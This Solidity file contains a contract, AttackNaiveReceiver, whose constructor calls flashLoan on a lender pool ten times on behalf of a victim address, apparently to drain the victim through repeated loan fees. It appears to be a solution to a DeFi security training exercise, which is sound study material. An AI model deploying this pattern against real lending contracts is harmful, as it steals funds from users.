// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    uint256 private constant AMOUNT = 0.1 ether;

    constructor(address victim, address payable naiveReceiverLenderPool) {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(naiveReceiverLenderPool).flashLoan(victim, AMOUNT);
        }
    }
}
